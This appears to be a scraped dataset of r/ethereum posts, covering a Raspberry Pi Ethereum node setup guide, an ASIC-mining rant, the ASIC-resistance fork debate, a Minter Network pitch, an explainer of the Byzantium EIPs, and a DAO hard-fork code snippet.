* 30303 Port forwarding (Eth 1.0) and 13000 port forwarding (Eth 2.0) \[4\]
* A case with heatsink and fan (Optional but strongly recommended)
* USB keyboard, Monitor and HDMI cable (micro-HDMI) (Optional)

# Storage

You will need and SSD to run the Ethereum clients (without an SSD drive there‚Äôs absolutely no chance of syncing the Ethereum blockchain). There are 2 options:

* Use a USB portable SSD disk such as the Samsung T5 Portable SSD.
* Use a USB 3.0 External Hard Drive Case with a SSD Disk. In our case we used a Inateck 2.5 Hard Drive Enclosure FE2011. Make sure to buy a case with an UAS compliant chip, particularly, one of these: JMicron (JMS567 or JMS578) or ASMedia (ASM1153E).

In both cases, avoid getting low quality SSD disks as it is a key component of you node and it can drastically affect the performance (and sync times)

Keep in mind that you need to plug the disk to an USB 3.0 port (blue)

# Image download & installation

**1.- Download Eth 1.0 or Eth 2.0 images:**

[ubuntu-20.04-preinstalled-server-arm64+raspi-eth1.img.zip](https://ethraspbian.com/downloads/ubuntu-20.04-preinstalled-server-arm64+raspi-eth1.img.zip)

sha256 34f105201482279a5e83decd265bd124d167b0fefa43bc05e4268ff899b46f19

[ubuntu-20.04-preinstalled-server-arm64+raspi-eth2.img.zip](https://ethraspbian.com/downloads/ubuntu-20.04-preinstalled-server-arm64+raspi-eth2.img.zip)

sha256 74c0c15b708720e5ae5cac324f1afded6316537fb17166109326755232cd316e

**2.- Flash the image**

Insert the microSD in your Desktop / Laptop and download the file (Eth 1.0, for instance):

    wget https://ethraspbian.com/downloads/ubuntu-20.04-preinstalled-server-arm64+raspi-eth1.img.zip

Note: If you are not comfortable with command line or if you are running Windows, you can use Etcher ([https://etcher.io](https://etcher.io/))

Open a terminal and check your MicroSD device name running:

    sudo fdisk -l

You should see a device named mmcblk0 or sdd. Unzip and flash the image:

    unzip ubuntu-20.04-preinstalled-server-arm64+raspi-eth1.img.zip
    sudo dd bs=1M if=ubuntu-20.04-preinstalled-server-arm64+raspi-eth1.img of=/dev/mmcblk0 && sync

**3.- Insert de MicroSD into the Raspberry Pi 4. Connect an Ethernet cable and attach the USB SSD disk** (make sure you are using a blue port).

**4.- Power on the device**

The Ubuntu OS will boot up in less than one minute but **you will need to wait approximately 10 minutes** in order to allow the script to perform the necessary tasks to turn the device into an Ethereum node and reboot the Raspberry.

Depending on the image, you will be running:

* Eth 1.0: Geth as the default client syncing the blockchain
* Eth 2.0: Prysm as default client syncing the beacon chain (Topaz testnet)

**5.- Log in**

You can log in through SSH or using the console (if you have a monitor and keyboard attached)

    User: ethereum
    Password: ethereum

You will be prompted to change the password on first login, so you will need to login twice.

**6.- Open 30303 port for Geth and 13000 if you are running Prysm beacon chain.** If you don‚Äôt know how to do this, google ‚Äúport forwarding‚Äù followed by your router model.

**7.- Getting console output**

You can see what‚Äôs happening in the background by typing:

    sudo tail -f /var/log/syslog

Congratulations. You are now running a full Ethereum node on your Raspberry Pi 4.

# Syncing the Blockchain

Now you need to wait for the blockchain to be synced. In the case of Eth 1.0 This will take a few days depending on several factors but you can expect up to about 5-7 days.

If you are running the Eth 2.0 Topaz tesnet you can expect 1-2 days of Beacon chain synchronization time. Remember that you will need to setup the validator later in order to start the staking process (see ‚ÄúHow to run the Eth 2.0 validator‚Äù section below).

# Monitoring dashboards

For this first release, we included 3 monitoring dashboards based on Prometheus \[5\] / Grafana \[6\] in order to monitor the node and clients‚Äô data (Geth and Besu). You can access through your web browser:

    URL: http://your_raspberrypi_IP:3000
    User: admin
    Password: ethereum

# Switching clients

All clients run as a systemd service. This is important because in case of some problem arises the system will respawn the process automatically.

Geth and Prysm beacon chain run by default (depending on what you are synchronizing, Eth 1.0 or Eth 2.0) so, if you want to switch to other clients (from Geth to Nethermind, for instance), you need to stop and disable Geth first, and enable and start the other client:

    sudo systemctl stop geth && sudo systemctl disable geth

Commands to enable and start each Eth 1.0 client:

    sudo systemctl enable besu && sudo systemctl start besu
    sudo systemctl enable nethermind && sudo systemctl start nethermind
    sudo systemctl enable parity && sudo systemctl start parity

Eth 2.0:

    sudo systemctl stop prysm-beacon && sudo systemctl disable prysm-beacon
    sudo systemctl start lighthouse && sudo systemctl enable lighthouse

# Changing parameters

Clients‚Äô config files are located in the /etc/ethereum/ directory. You can edit these files and restart the systemd service in order for the changes to take effect. The only exception is Nethermind which, additionally, has a mainnet config file located here:

    /etc/nethermind/configs/mainnet.cfg

Blockchain clients‚Äô data is stored on the ethereum home account as follows (note the dot before the directory name):

Eth 1.0

    /home/ethereum/.geth
    /home/ethereum/.parity
    /home/ethereum/.besu
    /home/ethereum/.nethermind

Eth2.0

    /home/ethereum/.eth2
    /home/ethereum/.eth2validators
    /home/ethereum/.lighthouse
    Hyperledger Besu and Nethermind

# Nethermind and Hyperledger Besu

These 2 great Eth 1.0 clients have become a great alternative to Geth and Parity. The more diversity in the network, the better, so you may give them a try and contribute to the network health.

Both need further testing so feel free to play with them and report back your feedback.

# How to run the Eth 2.0 validator (staking)

Once the Topaz testnet beacon chain is synchronized you can run a validator in the same device. You will need to follow the steps described here:

[https://prylabs.net/participate](https://prylabs.net/participate)

The first time, you need to create manually an account by running the ‚Äúvalidator‚Äù binary and setup a password. Once you completed this step you can add the password to /etc/ethereum/prysm-validator.conf and start the validator as a systemd service

# Feeback appreciated

We put a lot of work trying to setup the Raspberry Pi 4 as a full Ethereum node as we know the massive user base of this device may have a very positive impact in the network.

Please, take into account that this is the first image based on Ubuntu 20.04 so there may be some bugs. If so, open an issue on Github or reach us on twitter ([https://twitter.com/EthereumOnARM](https://twitter.com/EthereumOnARM)).

**EDIT 2: CENSORSHIP ATTACK --- > It's now again online.**

    ######################################
    ALERT REDDIT CENSORSHIP: THIS THREAD JUST STARTED GAINING TRACTION #1 ON FRONTPAGE (FAST ACCELERATION FROM 70 UPVOTES TO 100+) AND IT WAS QUICKLY REMOVED FROM THE FRONTPAGE. Safe this page, archive it and protect it in case they will delete it.
    First they removed it from the front page. (I have archives no worries)
    Second they deleted OP (check https://i.imgur.com/26OBf8q.jpg or https://web.archive.org/web/20180915123751/https://www.reddit.com/r/ethereum/comments/9fyldx/breaking_news_new_asic_with_737x_efficiency_of_e3/)
    Third they put it back on, figured they will upset community.
    Still gone from frontpage
    STOP FUCKING WITH THE ETHEREUM COMMUNITY WITH YOUR HIDDEN AGENDA and if this was *proven* to be removed by accident (hard to imagine) then I'll take all that back and will say sorry.
    ######################################

**BREAKING NEWS**

**The Beast is announced.**

[https://www.coindesk.com/a-new-line-of-powerful-asic-miners-is-coming-to-ethereum](https://www.coindesk.com/a-new-line-of-powerful-asic-miners-is-coming-to-ethereum/)

Just as I have said many times before, when they fear their hardware becoming worthless, which an Ethereum ASIC-fork-off would do, they will try ANYTHING to get ASICs to the masses. Now what would you do if you have developped an ASIC 62.2x more efficient than Bitmain's and you feel a sentiment becoming stronger in the Ethereum community (to fork ASICs off)? **EXACTLY** I would put out a PR right then and there saying I will release a 62.2x more efficient ASIC miner to the market in the beginning of the next year.

This way they can kill 2 birds with one stone:

1. Put Bitmain, their competitor, under massive pressure, who will now firesale their ASICs, getting ASICs to the masses.
2. Getting ASICs to the masses prevents Ethereum to fork because community doesn't want to when they own ASICs. This protects their hardware.

Do you believe an ASIC ~~7.37x~~ 62.2x more efficient than the E3 isn't long mining on the network? If that doesn't make eth devs fork, we definitely know they have a hidden agenda and that \[tinfoil hat on\] maybe some of the devs are compromised by Bitmain/other ASIC manufacturers. This is a **multi B economy** after all. \[tinfoil hat off\]

ASIC manufacturers are systemically exploiting and straight out scamming consumers out of their hard-earned money, the best case would be the new Zcash miners, let me lay it out for you:

\- In June a Zmaster A9 had a price of 10,000 and a break even time of around 70-80 days.

\- In July/August Zmaster A9 had a price of 5000-6000 and a break even time of around 70-80 days

\- In September Zmaster A9 had a price of 3000-4000 and a break even time of around 70-80 days

Personal prediction:

\- In October-November Zmaster will be 1500-2000 and will have a break even time of around 70-80 days

Note: The ones who bought the Zmaster A9 in June still haven't broken even.

Do you see the pattern?

First they pre-mine, then they manufacture their second gen, then they sell their miners in a very shady way laid out above. Once they sold them they crush difficulty slowly and will soon release their ""Zmaster A9 Grande"" and will do the whole thing over. Each time milking the miner community, as many people are naive and buying into this shady scheme, blinded by break even times which mostly only last 2-3 weeks.

NVIDIA and AMD are not doing this because

1. They are reputable decades old public companies that haven't their core business in crypto **at all**
2. They would get sued immediately for running a fraudulent scheme

Conclusion:

**If ETH doesn't fork ASICs off they are the enabler that allows small time miners to get scammed by ASIC manufacturers. I wonder how they can square that with their conscience.**

*Edit: Check (for example)* [*https://www.youtube.com/watch?v=q52CepI1DD8*](https://www.youtube.com/watch?v=q52CepI1DD8)

*And this isn't just about one manufacturer, I already was interested in mining back in 2012/2013 and I did mine a little with my GPU and I wanted to get myself an ASIC. Back then you would order in march and get your product in November, by that time a more efficient ASIC would have been on the market and youd be delivered a couple thousand dollar brick to your doorstep. It's gotten a little better but the manufacturers will continue this until there's real world-wide competition. We got another couple years until that happens. So ASICs are bad as of this moment, not because ASICs are bad themselves, but without exception all manufacturers are. You can't even hold them accountable since all are in China and all of them state on their websites that they don't do refunds.*

*So just fork it and be done with this discussion, it's obvious to everyone what has to be done. If Monero and others can do it I'm sure you can too.*

>At present, the **company is still working on developing the product**. Customers may begin receiving their miners in April 2019, according to the presentation.

If anyone believes that I'm sorry to tell you: You're straight out stupid or the most naive person I have ever met."
0,ethereum,"Minter Network Submission to The Reddit Scaling Bake-Off &#x200B;

[Minter Community's Open Letter to Reddit](https://preview.redd.it/030uhu6hxke51.png?width=2400&format=png&auto=webp&s=d37c840ffb8db0eb59907c4475bec654b9a96bbc)

Dea[r/all](https://www.reddit.com/r/all/),

We were thrilled to find out Reddit was going to use distributed ledger technology for driving user engagement, interaction, and loyalty. The front page of the Internet switching to Web 3.0 is something you don‚Äôt see every day: fifteen years into existence, you‚Äôre once again on the cutting edge of innovation.

‚ÄúThere are plenty of awesome projects that we don‚Äôt know about yet,‚Äù reads the text you [put up](https://www.reddit.com/r/ethereum/comments/hbjx25/the_great_reddit_scaling_bakeoff) recently. ‚ÄúMost existing scaling solutions focus on the exchange use case.‚Äù What we would like to offer here in this letter is an alternative: although Minter is separate from Ethereum, the project‚Äôs top priority is enabling brands ‚Äî small, medium, and large alike ‚Äî to implement blockchain-powered incentive and reward mechanisms into their operation.

**Every facet of our network is tailored to this very need:**

* The transaction is finalized in five seconds
* The fee never exceeds one cent
* The scalability is up to 180 million daily transactions
* Any community (*think of subreddits*) can issue their own coin in just 60 seconds, which can be then swapped not only for one another, but also for items such as iTunes gift cards, XBOX subscriptions, or any of the remaining 18,000 options ‚Äî proving Minter provides a global solution aimed to achieve the goal you‚Äôve set
* Easy-to-use, user-centric wallets are available across all platforms
* Our blockchain ‚Äî as well as the vast majority of services built atop it ‚Äî is [open-source](https://github.com/MinterTeam/minter-go-node), and the documentation is [detailed](https://docs.minter.network/)

**Demo**

100 transactions within 4.72 seconds - [this block in the mainnet](https://explorer.minter.network/transactions/Mt765f2472bb62297ee05e9c4afe28dd17e1aa271b14b6c04fc0d4efecdb939ad0)

    100*(60/4.72)*60*24 = 1 830 508 transactions / day

The price of 1.8ml transactions is 9244 BIP tokens or $75 with the current BIP price ([reference](https://coinmarketcap.com/currencies/minter-network/))

Point claims, transfers, point burning, subscriptions can be handled by blockchain utilizing transaction payload feature.

**Scaling**

Currently, the blockchain has an ability to proceed 10 000 transactions per block, it means that Minter is scalable up to 183 050 800 daily transactions, if necessary.

**Decentralization and Security**

In Minter, we implemented the Delegated Proof of Stake (dPoS) Consensus Protocol. Minter Blockchain utilizes:

    Tendermint Consensus Engine

dPoS is the fastest, most efficient, most decentralized, and most flexible consensus model available. dPoS leverages the power of stakeholder approval voting to resolve consensus issues in a fair and democratic way.

Minter blockchain now has 58 independent validators producing 1 block per 5 sec.

**Usability**

If Reddit would use Minter as their blockchain for Community points then all Redditors:

\- would not have problems with everyday coin operations, as Minter has well developed user-centric wallet apps for main platforms, iOS, Android, Web. Taste yourself!

* [iOS](https://apps.apple.com/ru/app/bip-wallet/id1457843214)
* [Android](https://play.google.com/store/apps/details?id=network.minter.bipwallet.mainnet)
* [Web](https://wallet.bip.to/)

\- would have their transactions processed within 5 seconds. Is it a reasonable amount of time? We think it is much more than that, it is pretty awesome.

\- would never pay more than one Cent per transaction.

\- would easily see the whole transaction history in the app or via blockchain export.

* [https://explorer.minter.network/](https://explorer.minter.network/)
* [https://minterscan.net/](https://minterscan.net/)

Issue *subreddit* coins in just 60 seconds, swap not only for one another, but also for items such as iTunes gift cards, XBOX subscriptions, or any of the remaining 18,000 options.

**Interoperability**

Minter team has developed a comprehensive toolset for third-party developers, which includes the [Console](https://console.minter.network/), [SDK](https://www.minter.network/docs#minter-sdks), and [API](https://www.minter.network/docs#other-public-services) for advanced integration. Our blockchain ‚Äî as well as the vast majority of services built atop it ‚Äî is [open-source](https://github.com/MinterTeam/minter-go-node).

**Some numbers**

* May 15, 2019 - mainnet launch
* 1,557 - active coins
* Over 9ml - transactions
* Over 7,6ml - blocks
* 4.63 - avg. seconds per block
* 58 - blockchain validators and growing
* Over 100 000 - BIP Wallet downloads

**Green light**

All we ask for is a green light to integrate any of the Reddit communities into our platform, seeing hundreds of millions of transactions in branded coins each and every day. One week is the time we need to make it work.

We would like to take this moment to thank the entire Reddit team for striving to make the Internet a better place. And if you are interested in the proposition we outlined above, please don‚Äôt hesitate to [contact](https://minter.org/korytov) Mikhail for further communication.

Also, please check our article: [Blockchain Reward System: Reddit Case Study](https://medium.com/@MinterTeam/blockchain-reward-system-99be560b3c42)

0,ethereum,"ASIC Resistant Hard Fork Discussion Overview **I am speaking on behalf of myself, Hudson Jameson, and not on behalf of the Ethereum Foundation or any other entity. However, I am a lawyer/doctor and this post is both medical and legal advice. Just kidding, it isn't.**

Hey all!

I've been closely following the debate that has been happening across social media and chat channels the past 2 weeks regarding the possibility of designing and implementing a new ASIC resistant proof-of-work algorithm. The debate is over whether or not we should hard fork the Ethereum network in order to prevent ASIC miners from operating. I am in the unique position of organizing and running the bi-weekly core developer meetings and have been active in the ecosystem for a while. I want to make sure both sides feel like they are heard. This post is meant to provide context and offer next steps for both sides of the argument.

## Facts

- It is confirmed that an ASIC miner able to mine the Ethash algorithm [has been developed](https://shop.bitmain.com/product/detail?pid=00020180407155628542Kh79QU7M0649).
- About 2 weeks an [EIP](http://eips.ethereum.org/) was created by Piper Merriam called ""[EIP 958: Modify block mining to be ASIC resistant.](https://github.com/ethereum/EIPs/pull/958)"". Piper opened the EIP intending for it to be a starting point for both technical and non-technical discussion about ASIC resistant algorithm changes. His role in the EIP is to act as a neutral facilitator and not as an expert. The EIP is now closed at the request of the author. Discussion has continued in other forums such as Reddit.
- About a week ago, AirSquirrels created ""[EIP 969: Early ASIC Mitigation Hardfork.](https://github.com/ethereum/EIPs/pull/969)"". This EIP is focused on technical discussion around an ASIC resistant hard fork. It has been merged in the EIP respository in Draft status in accordance with EIP 1. This does not indicate that the EIP is agreed upon or accepted, but that it meets the minimum technical requirements based on the EIP X template to be merged as a file into the repository.
- veox has been working on cleaning up EIP 969 from a grammatical and technical standpoint. The status of that EIP PR can be found [here](https://github.com/ethereum/EIPs/pull/979).
- EIP 958 was a topic of discussion at [the most recent core developer meeting](https://github.com/ethereum/pm/issues/36). The notes from the meeting and a link to a video recording of the meeting can be [found here](https://github.com/ethereum/pm/blob/master/All%20Core%20Devs%20Meetings/Meeting%2036.md).

**This next section is my best effort at summarizing the arguments from both sides. I am numbering them to make it easier to reference a specific argument for or against.**

### Pro ASIC Resistance (PAR)
There are 2 great resources that provide more detail to these bullet points.

1. [Medium Article - Why Ethereum should adjust algo on next planned Hardfork? From a Miner‚Äôs perspective](https://medium.com/@bitsbetrippin/why-ethereum-should-adjust-algo-on-next-planned-hardfork-from-a-miners-perspective-aa0afeef05b9) by /u/bitsbetrippin.
2. [/r/EtherMining Thread - Regarding Threads on Bitmain and ASIC Resistance (Mega Thread!)] (https://www.reddit.com/r/EtherMining/comments/8auy55/regarding_threads_on_bitmain_and_asic_resistance/) by /u/Robbbbbbbbb.

- PAR 1: It is a security risk that ASICs are allowed to exist on the Ethereum network. With one entity having a majority of the hashing power, 51% attacks are a real possibility.
- PAR 2: The Ethereum White Paper declared that Ethereum was built to be ""ASIC resistant"", at least from the perspective of being resistant to economic incentives to produce ASICs. If this wasn't a false narrative it needs to be upheld.
- PAR 3: Bitmain being allowed to mine using ASICs on the network would cause increased centralization in Ethereum.
- PAR 4: Bitmain may have a better ASIC that they have not revealed that they are using to mine the network currently. This amplifies the other risks and eliminates some of the uncertainties around how much of an improvement Ethash ASICs are compared to GPU mining if true.
- PAR 5: Bitmain has been proven to be hostile to cryptocurrency groups. This can be shown by their hostility to Bitcoin when they got involved in Bitcoin Cash. Their business practices are not altruistic in any way.
- PAR 6: After Monero forked to prevent ASICs their hash power dropped 70%+ which proves that ASICs were secretly mining on their network. The same could be happening to Ethereum today which is why we need to act quickly.
- PAR 7: ASICs would eliminate hobbyist miners and make it difficult for the Average Jane to mine Ethereum.

### Pro Doing Nothing (PDN)
There are 2 great resources that provide more detail to these bullet points.

1. [Blog post - Anti-ASIC Forks Considered Harmful](https://pdaian.com/blog/anti-asic-forks-considered-harmful/) by [Phil Daian](https://twitter.com/phildaian?lang=en).
2. [Ethereum Core Developer Meeting #36 Notes/Video](https://github.com/ethereum/pm/blob/master/All%20Core%20Devs%20Meetings/Meeting%2036.md). Arguments described in the recent core developer meeting have a timestamp linking to the video.

- PDN 1: The efficiency gains accomplished by the ASIC is relatively limited. At the time this comment was made on the code devs call, Batch 1 of the Bitmain ASIC's sold for $800 for 180MH/s which is a 2.5x factor improvement over GPUs. Batch 2 now sells for $1,800, but the argument can still technically be made, albeit with a different improvement level. [(35:38)](https://youtu.be/SoPfoNpqG0k)
- PDN 2: We are unsure what protocol changes would make a difference. Even if we switch to a PoW algorithm that is entirely different and not I/O bound at all, such as SHA3, it may only buy us 6-12 months. [(37:37)](https://youtu.be/SoPfoNpqG0k?t=2257)
- PDN 3: The development effort to change the PoW algorithm and getting everyone to upgrade would be chaotic and risky. Developing, testing, planning, and enacting a hard fork and related code is not a simple process. [(38:47)](https://youtu.be/SoPfoNpqG0k?t=2327)
- PDN 4: Focusing on changing the PoW algorithm would detract from more important things, such as Casper, sharding, and other protocol level work. [(38:47)](https://youtu.be/SoPfoNpqG0k?t=2327)
- PDN 5: The Ethereum network is switching to proof-of-stake (Casper) soon‚Ñ¢ so changing the PoW algorithm detracts from the research and development. Changing the PoW algorithm would serves as a band-aid while Casper is both an eventuality and a permanent solution.
- PDN 6: The worst case scenario is that Bitmain controls a large portion of the Ethereum network for some time. If they try to use it for malicious purposes, Casper development can be sped up, launched in a week (albeit with potentially more bugs and skipping formal verification/academic review), and mining rewards would go down by 90%. If geth and Parity start making it a higher priority to implement Casper it would provide us with some insurance in the case of a 51% attack.[(39:05)](https://youtu.be/SoPfoNpqG0k?t=2345)
- PDN 7: It is impossible to prevent anti-competitive economies of scale from forming around mining. Large corporations and entities will achieve economies of scale in any mining model, including general purpose hardware / GPU-dominated mining (see [Phil's blog](https://pdaian.com/blog/anti-asic-forks-considered-harmful/) I previously referenced).
- PDN 8: Anti-ASIC forks reduce the cost to attack a cryptocurrency substantially and are a good thing for the security of a cryptocurrency system (see [Phil's blog](https://pdaian.com/blog/anti-asic-forks-considered-harmful/) I previously referenced).

## How long until Casper is launched?

This seems to be a sticking point in many of the arguments. Here is the latest:
Researchers are in the process of finalizing the code for the 2nd stage of the testnet with the goal of completing and freezing the full specification of the Casper PoS algorithm. geth and Parity could start implementing parts of the Casper today. Casper is currently being formally verified by Runtime Verification which should take another 4-5 months to complete. Multiple academic groups are also looking at Casper. A formal EIP on Casper is being worked on and will be released for review in the next 2 weeks. The plan is to have Runtime Verification formally verify Casper, relaunch a custom Casper testnet with specs from the EIP, relaunch the contract on an Ethereum testnet, and finally launch Casper on the mainnet. There is no official timeline and there is unlikely to be one, in my opinion, until we get much closer to Casper being formally verified. [(40:23)](https://youtu.be/SoPfoNpqG0k?t=2423)

## So what now?

Well I for one am going to make myself a whiskey. Not because this was stressful, but because I enjoy whiskey. I actually find this pretty fun.

Anyways, if you are in the PAR group I suggest you act on your convictions and help with some of the EIPs being produced. If you are in the PDN group you can provide counter-arguments to the PAR group in forums/chat rooms. Currently the rough consensus of Ethereum core developers is that of the PDN group. However, my experience is that they are open to whatever the community wants as long as community consensus, or something close to it, can be demonstrated. There are many ways to determine this, including voting and discussions and EIPs. I encourage everyone to participate in this process.

## You said a thing wrong!

If you feel like I left off an argument or made a mistake in this post let me know in the comments. I'll track edits at the bottom of this post.

One argument I regularly see from other smart contract platforms is that they're going to support multiple languages or a more popular programming language for their smart contracts.

Not that developers can't pick up Solidity, once you know one language the core programming concepts carry over, but it's definitely a significant barrier to entry, especially when it's literally the only use case for that language.

eWASM is a great solution, create a virtual machine with the same ""architecture"" that can run platform-independent byte-code compiled from any language, and better yet, just piggy-back off all the work developers are already doing to get the Web independent of JavaScript.

It's a great move and eliminates what is in my opinion one of the remaining roadblocks for Ethereum development to skyrocket."

If you are late to the party, [we compiled all the highlights from this AMA on our blog](http://bit.ly/LoomAMAHighlights) so you can catch up easily. Let's do this again sometime! üòä ‚Äî James_

Hi Ethereum community! 

My name is James Duffy ([PROOF](https://i.imgur.com/L1M73QL.jpg)) and I‚Äôm the Co-Founder of [Loom Network](https://loomx.io/).

We‚Äôre building a layer 2 solution to help Ethereum scale. Our [developer SDK](https://medium.com/loom-network/loom-network-sdk-alpha-release-first-5-dappchains-announced-sdk-roadmap-1dddec789004) will be released next month, and allows DApps to be built on highly scalable DPoS sidechains, secured by [Plasma Cash](https://medium.com/loom-network/loom-network-plasma-5e86caaadef2) on mainnet. This enables a new class of DApps that require a high very throughput (like online games), while still providing the security guarantees of Ethereum for tokenized assets.

In short, you can think of Loom Network as bringing EOS-like functionality to Ethereum.

We‚Äôre also the makers of [CryptoZombies.io](https://cryptozombies.io) ‚Äî a fun, interactive ‚Äúcode school‚Äù where you learn to build Ethereum DApps by making your own zombie game. We are super proud to have helped almost 200,000 developers learn Ethereum development using CryptoZombies to date.

If you‚Äôve never heard of Loom before, [this post](https://medium.com/loom-network/everything-you-need-to-know-about-loom-network-all-in-one-place-updated-regularly-64742bd839fe) might be helpful. 

I, along with others from our dev team (like my co-founder /u/mcampbell42), would be more than happy to answer any questions you might have about Ethereum scalability, Plasma Cash, DApp development, and the projects we are working on at Loom. 

P.S: Already asked permission from Mods (/u/avsa) about this."
0,ethereum,"I am making a dapp where you can flip virtual real estate for ether and build houses in The Sims style - Looking for a few beta testers (ropsten - no ether needed) A few months ago I [posted](https://www.reddit.com/r/ethereum/comments/7lhm81/any_interest_in_an_ethereumtycoon_game_where_you/) about a  prototype of a dapp where you can earn ETH by buying and selling (flipping) virtual real estate. After some detours, and spending way too much time on details like 3d modeling, furniture, finishes, and art styles, it finally looks to be coming together more or less. 

[screenshots on imgur](https://imgur.com/a/fVa09Wk)

Currently I'm looking for some beta testers. Since this is a 3D app, a decent gaming desktop rig would be good to have. 

The dapp is currently running on the Ropsten test chain, so its still completely free.


The dapp/game works as follows:


1. Grow your real estate portfolio by buying lots. The price depends on the lot size and if there is a house already.


2. Design a house in The Sims style, or improve the house if the lot already had one (or raze and start over). Designing is completely free and you can destroy and rebuild unlimitedly without having to sign any metamask transaction.


3. Once you want to sell one or more of your properties, you'll have to pay a fee for the final structure, depending on its size/furniture/vehicles.


4. Then you can sell (flip) the property for your chosen price. The number of plots is quite limited which creates scarcety.


5. If you just like to design houses, you only have to buy one empty lot of land, and you'll never have any other costs since building is free until you want to sell your house.


[Game guide and screenshots here](https://www.ethtycoon.app/)


Anyone that liked building houses in The Sims and has a decent gfx card can be beta tester :)

0,ethereum,"ELI5: Byzantium Changes I'll attempt to explain the first [Metropolis hard fork changes](https://blog.ethereum.org/2017/09/14/geth-1-7-megara/) in a way I can understand them myself. Since I'm not a low level core dev, I hope this can be useful for others. I welcome any comments or corrections:


#### EIP 98: Removal of intermediate state roots from receipts (#14750).

This allows more parallelization on transaction processing, as not all transactions require the result of the previous one.

#### Expanded by EIP 658: Embedding transaction return data in receipts (#15014).
This allows light clients to be able to see if a call they made was executed properly or if it failed. This could only be verified by full nodes previously.

#### EIP 100: Change difficulty adjustment to target mean block time including uncles (#14733).
In bitcoin, only miners who found a block and sucessfully added it to the main chain received block rewards. This leads some ineffiency and some miner centralization as miners who were physically close had an advantadge and wasted work so Ethereum created the uncle reward, in which if you found a correct block but it lost the race to reach all other miners, you would still get paid. But this led to an error in which the total issuance was slightly higher than the expected 5 ether per block in an unpredictable way: during moments where internet connectivity lagged or the network was too busy, more uncles would mean more ether was created. This EIP fixes that.  


#### EIP 198, EIP 212 (197) and EIP 213 (196): Precompiled contracts for modular exponentiation; elliptic curve addition, scalar multiplication and pairing (#14959, #14993).

Adds some cryptographic primitives that enable some new use cases, mostly around zk-snarks. This indirectly enables new novel uses, including higher privacy, scalability and other stuff people will come up with.


#### EIP 214 (116): Expanding the EVM with static contract calls (#14978).
Whenever a contract calls another contract in the middle of their function, that contract takes priority and can then do anything it wants, including calling the original contract back. This creates some complicated situations that makes writing smart contract more complex as there are tons of ways in which your contract state might have changed after that call in which you can't predict (The Dao bug, for instance). This creates a safer way to call an unknown contract from inside your contract.


#### EIP 211: Expanding the EVM with dynamically sized return data (#14981).

**explanation from /u/izqui9** At the moment when you make a call to another contract you must specify how many bytes of return data will be copied. EIP 211 introduces two new opcodes RETURNDATASIZE and RETURNDATACOPY. After making a call you can check how many bytes the call returned and then copy exactly that many bytes. This is specially exciting as it will enable Forwarding contracts to return exactly what the underlying call returned. Right now Forwarding contracts rely on hardcoding how much memory they will read from the call, but this is not a good solution for dynamic sized types such as strings or bytes array that can have an arbitrary size.

#### EIP 206 (140): Expanding the EVM with cheap state revertals (#14983).
In almost any contract you usually want to check multiple situations that would prevent a transaction from being executed: maybe the caller is not authorized to do that transaction (not the owner!) or maybe the contract is not yet on a state in which it can do that (crowdsale has not started) or some other limit (participation cap is reached!). When that happens you want all execution to stop and no state to change so you execute a `throw` function. The issue is that is an expensive call: it burns all the gas sent and doesn't provide the user any way to tell the reason it failed. This introduces a better way to do it: by using revert instead of throw, you only spend the gas the user actually used, and it provides a useful error code telling the user *why* their transaction failed. Super useful for app development!

#### EIP 649: Delaying the difficulty bomb and reducing the block reward (#15028).
Self explanatory: delays the iceage by 18 extra months and reduces block reward to 3 ether in preparation for future PoS reduction.

#### EIP 684: Preventing overwriting contracts (Byzantium prep) (#15039).
Byzantium will change the way in which contract addresses are created. This prepares to prevent collisions, by preventing contracts from being deployed where there's another one existing.

## What is Ethereum?

Ethereum is a cutting edge blockchain-based distributed computing platform, featuring smart contract functionality. It provides a decentralized virtual machine, the Ethereum Virtual Machine (EVM), that can execute peer-to-peer contracts using a cryptocurrency called ether.

0,ethereum,"Help! Dual-mining Ethereum is hurting PascalCoin. I am a core developer of PascalCoin (www.pascalcoin.org) and I am posting this here reaching out for assistance from the Ethereum community.

We are a Proof-of-Work coin, 100% original and offering innovative approach for scaling. We have introduced a new cryptographic data-structure known as the SafeBox that allows us to delete the blockchain after 100 blocks whilst retaining SPV security of entire chain. We have already achieved 140+ txn/sec on the mainchain and have, in my opinion, a genuine value proposition for this sector. I am only stating this to prove we are not just some ""clone-coin"" or ""scam-coin"" when compared to other coins with higher marketcap. We believe we have a solid value proposition.

All good and great, except we have an interesting economic problem being ""caused"" by Ethereum miners. Since we are GPU-friendly PoW currency, it has made us a prime candidate for dual-mining by the Ethereum-centric Nanopool.

The introduction of dual-mining has fundamentally changed the economics and incentives of mining for the ""secondary coin"". Let me explain.

Ordinarily, a coins mining eco-system grows organically with interest and centralisation does not occur. This is due to the *""hashpower follows price""* law. As price grows organically due to interest, so do the number of miners. If there are too many miners, the coin becomes unprofitable, and some miners leave. This homeostasis between mining, price and eco-system size seems to be part of the magic of Satoshi's miracle economic innovation. 

With dual-mining, **this is broken**. Dual-mining has led to coins with small user-base to have totally disproportionate number of miners who mine the coin even when ""unprofitable"". In our case, miners are primarily on Nanopool to mine Ethereum, not PascalCoin. So the number of PascalCoin miners are a function of Ethereum's ecosystem, not PascalCoin's eco-system. Also, these miners mine PascalCoin because they have latent computing power, so it technically costs them nothing to mine PascalCoin. This obviously changes the economics!

This has resulted in a 99% mining centralisation in Nanopool, yet they are not malicious at all. Due to this centralisation, several exchanges have paused their integration of PascalCoin because of the theoretical threat posed by this centralisation. This has blocked our growth.

So now we have a situation where miners are actually hurting the coin and it's value, yet their hashpower is increasing. 

Anyway, enough with the problem. The solution I've come up with is to embrace dual-mining rather than fight it. This means we need *more* Ethereum pools to offer dual-mining PascalCoin, that way we can balance out the distribution.

This is where you can help. Can you please help put me in contact with pool operators. Either PM me a contact person or forward them this post. I am prepared to pay good money to offset the integration costs. I am particularly interested in the following pools: f2pool, ethermine, ethfans, miningpoolhub, bitclubpool, dwarfpool, bw, ethpool.

Thanks for taking the time to read this and assisting if you can."
0,ethereum,"The Current HF Status 1) The implementation has been largely spec-frozen to the following python:

    # call before running transactions
    def initialize():
        if state.block_number == DAO_HARDFORK_BLKNUM:
            for acct in HARDFORK_DAO_LIST:
                state.set_balance(HARDFORK_DEST, state.get_balance(acct) + state.get_balance(HARDFORK_DEST))
                state.set_balance(acct, 0)

However, the dev community is debating the simplest way to minimize risks of issues related to light client syncing. The actual logic that allows DAO token holders to claim their ether would be implemented in `HARDFORK_DEST`.

2) The ether claiming logic is largely a simple withdrawable token contract, but small details are being debated regarding how to deal with secondary daos, legit splits, etc. Note that this can proceed in parallel to (1), there are no sequential dependencies. Simplicity of the ether claiming contract is understood to be a very important concern. 
 
